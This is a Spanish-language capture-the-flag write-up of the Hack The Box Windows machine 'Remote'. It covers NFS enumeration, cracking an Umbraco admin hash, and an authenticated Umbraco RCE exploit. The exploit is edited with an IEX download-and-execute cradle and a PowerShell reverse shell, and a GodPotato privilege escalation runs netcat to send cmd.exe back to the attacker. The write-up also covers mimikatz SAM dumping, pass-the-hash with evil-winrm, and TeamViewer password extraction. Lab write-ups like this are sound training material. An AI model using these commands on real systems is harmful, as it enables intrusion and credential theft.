---
title: "Remote - WriteUp"
date: Wed Jul 24 2024 18:00:00 GMT+0200 (Central European Summer Time)
categories: [WriteUps, HTB, Windows]
tags: [ctf, nmap, htb, sudo, smb, exploit, winrm, ftp, windows, evil-winrm]
image: /assets/img/htb-writeups/Pasted-image-20231203185311.png
---

{% include machine-info.html
  machine="Remote"
  os="Windows"
  difficulty="Easy"
  platform="HTB"
%}

![Remote](/assets/img/htb-writeups/Pasted-image-20231203185311.png)

-----

Máquina Windows

NMAP

```bash
# Nmap 7.94SVN scan initiated Sun Dec  3 18:40:51 2023 as: nmap -sCV -p 21,80,111,135,139,445,2049,5985,47001,49664,49665,49666,49667,49678,49679,49680 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap.xsl -oN targeted -oX targetedXML 10.129.229.68
Nmap scan report for 10.129.229.68
Host is up (0.11s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-12-03T17:41:50
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -1s
```

HTTP 80

![REMOTE](/assets/img/htb-writeups/Pasted-image-20231203185311.png)

```http
http://10.129.229.68/umbraco/
```

![REMOTE](/assets/img/htb-writeups/Pasted-image-20231203201236.png)

111 RPC

Vamos a enumerar el puerto 111 tanto en TCP como en UDP para ver si encontramos algo interesante.

Con _nmap_ podríamos enumerarlo de las dos maneras siguientes:

```bash
$ sudo nmap -sSUC -p111 10.129.229.68
...
$ sudo nmap -p111 --script=nfs-showmount 10.129.229.68
```

Vamos a usar _rpcinfo_ para enumerar servicios.

```bash
$ rpcinfo 10.129.229.68
```

![REMOTE](/assets/img/htb-writeups/Pasted-image-20231203194007.png)

Tenemos el servicio _nfs_ con el que podríamos subir o descargar archivos. O también probar de montarlos. 

```bash
$ showmount -e 10.129.229.68
...
Export list for 10.129.229.68:
/site_backups (everyone)
```

Descubrimos una ruta (/site_backups) que podríamos montar ya que tiene permisos para todo el mundo.

```bash
$ sudo mkdir /mnt/remote
$ sudo mount -t nfs 10.129.229.68:/site_backups /mnt/remote -o nolock
```

Ahora nos vamos a la carpeta que acabamos de montar con permisos de solo lectura y exploraremos todo con detenimiento.

![REMOTE](/assets/img/htb-writeups/Pasted-image-20231203195344.png)

El dominio de correo es @htb.local

Descubro el archivo "Umbraco.sdf" con jugoso contenido en su interior.

![REMOTE](/assets/img/htb-writeups/Pasted-image-20231203212504.png)

```rb
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
```

Ahora toca descubrir si son hashes de verdad e identificarlos para intentar crackearlos.

![REMOTE](/assets/img/htb-writeups/Pasted-image-20231203212911.png)

Copiamos este hash en un archivo que he llamado "hash.SHA1" y lo intentamos descifrar con nuestro amigo del alma _john_:

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.SHA1
```

![REMOTE](/assets/img/htb-writeups/Pasted-image-20231203213642.png)

Y parece que tenemos ganador!

Apuntamos las credenciales encontradas.

```http
admin@htb.local:baconandcheese     ||    UMBRACO Login
```

Vamos a probar las credenciales en el CMS de Umbraco:

![REMOTE](/assets/img/htb-writeups/Pasted-image-20231203215008.png)

Y entramos!

![REMOTE](/assets/img/htb-writeups/Pasted-image-20231203215217.png)

Vamos a buscar la versión exacta de Umbraco para ver los exploits que hay.

![REMOTE](/assets/img/htb-writeups/Pasted-image-20231203215441.png)

Umbraco version 7.12.4 

![REMOTE](/assets/img/htb-writeups/Pasted-image-20231203215632.png)

Encontramos 2 con versión exacta y para Windows. Perfecto.

Nos copiamos el segundo exploit, el 49488 y lo ejecutamos con un comando sencillo para probar que funciuona:

```bash
$ python3 49488.py -u admin@htb.local -p baconandcheese -i 'http://10.129.229.68' -c whoami -a /priv
```

![REMOTE](/assets/img/htb-writeups/Pasted-image-20231204090523.png)

Y vemos que sí. Tenemos ejecución remota de comandos y encima ya vemos un privilegio explotable.

Para ello haremos uso del primer exploit. Nos lo copiaremos en nuestra carpeta y lo editaremos de la siguiente manera:

+Info: https://vk9-sec.com/umbraco-cms-7-12-4-authenticated-remote-code-execution/

Copiamos a nuestra carpeta también el script _Invoke-PowerShellTcp.ps1_, lo editaremos y al final pegaremos esta línea, adaptando la IP a la nuestra:

```PowerShell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.30 -Port 4444
```

Editamos el archivo .py del exploit dejándolo así:

![REMOTE](/assets/img/htb-writeups/Pasted-image-20231204093717.png)

Estas son las líneas en texto editable.

```PowerShell
"IEX(IWR http://10.10.16.30:9999/Invoke-PowerShellTcp.ps1 -UseBasicParsing)"
"powershell.exe"
login = "admin@htb.local";
password="baconandcheese";
host = "http://10.129.229.68";
```

Ahora lanzamos un servidor Web con Python para que el script nos lo coja y lo ejecute.

```bash
$ python3 -m http.server 9999
```

Nos ponemos a la escucha para recibir la shell:

```bash
nc -nlvp 4444
```

Y por último ejecutamos el exploit:

```bash
$ python3 46153.py
Start
[]
```

![REMOTE](/assets/img/htb-writeups/Pasted-image-20231204094807.png)

Dentro!

<font color="#92d050">ACTUALIZACIÓN</font>: También podemos usar el exploit de GitHub que es más fácil de aplicar. https://github.com/Jonoans/Umbraco-RCE

Registramos la bandera situada en C:\\Users\\Public\\user.txt y seguimos.

SYSTEMINFO

```PowerShell
Host Name:                 REMOTE
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00429-00521-62775-AA801
Original Install Date:     2/19/2020, 3:03:29 PM
System Boot Time:          12/4/2023, 2:59:50 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2394 Mhz
                           [02]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2394 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.21100432.B64.2301110304, 1/11/2023
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 723 MB
Virtual Memory: Max Size:  2,431 MB
Virtual Memory: Available: 1,189 MB
Virtual Memory: In Use:    1,242 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 4 Hotfix(s) Installed.
                           [01]: KB4534119
                           [02]: KB4516115
                           [03]: KB4523204
                           [04]: KB4464455
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.229.68
                                 [02]: fe80::d565:4a6d:9a3:24f0
                                 [03]: dead:beef::d565:4a6d:9a3:24f0
```

Como tenemos el privilegio "SeImpersonate" habilitado podemos escalar a ususario "System" de una vez.

Para ello crearemos una carpeta llamada "tmp" en "C:\\Users\\Public\\" y nos subiremos el exploit _GodPotato.exe_ y el binario _nc.exe_.

Aprovechando que tenemos el servidor Web Python levantado nos traeremos los archivos.

```PowerShell
> iwr -uri http://10.10.16.30:9999/nc.exe -Outfile nc.exe
...
> iwr -uri http://10.10.16.30:9999/godpotato.exe -Outfile godpotato.exe
```

Ahora nos ponemos en escucha con _NetCat_ y _rlwrap_ en el puerto 443 en otra terminal nueva:

```bash
$ rlwrap nc -nlvp 443
```

En la máquina víctima ejecutamos el exploit.

```PowerShell
PS C:\Users\public\tmp> .\godpotato.exe -cmd ".\nc.exe -t -e C:\windows\system32\cmd.exe 10.10.16.30 443"
```

![REMOTE](/assets/img/htb-writeups/Pasted-image-20231204102850.png)

Éxito. Registramos la bandera que nos queda sita en la carpeta del usuario Administrator y podemos dar por finalizada la máquina.

-------

ANEXO I:

En este punto también podríamos subir _mimikatz.exe_ y obtener el hash del usuario _Administrator_ para conectar por WinRM  para investigar la máquina de una manera más cómoda.

```
mimikatz # lsadump::sam
Domain : REMOTE
SysKey : d132fb96a18c6ee06dee89f8effb8e06
Local SID : S-1-5-21-20699823-1431297389-2359617369

SAMKey : fb905a9047b1c62c9d3e592866fc61e8

RID  : 000001f4 (500)
User : Administrator
Hash NTLM: 86fc053bc0b23588798277b22540c40c
```

```bash
$ evil-winrm -i 10.129.229.68 -u 'Administrator' -H '86fc053bc0b23588798277b22540c40c'
```

![REMOTE](/assets/img/htb-writeups/Pasted-image-20231204110453.png)

--------

ANEXO II:

FORMA CORRECTA DE HACER ESCALADA DE PRIVILEGIOS EN ESTA MÁQUINA

Para la escalada de privilegios en vez de tirar de _GodPotato_, la máquina está pensada para escalar a través de la aplicación que tiene instalada "Teamviewer". 

Nos descargamos el script _WatchTV.ps1_ de https://github.com/zaphoxx/WatchTV/tree/master y lo subimos a la máquina.

En la máquina remota ejecutamos:

```PowerShell
> Import-Module .\WatchTV.ps1
> Get-TeamViewPasswords
```

![REMOTE](/assets/img/htb-writeups/Pasted-image-20231204115353.png)

Y nos encontrará el password del usuario Administrador en texto plano.

```http
Administrator:!R3m0te!
```

Y ya podremos conectar mediante WinRM:

```bash
$ evil-winrm -i 10.129.229.68 -u 'Administrator' -p '!R3m0te!'
```

-------
---

**Última actualización**: 2024-07-24<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
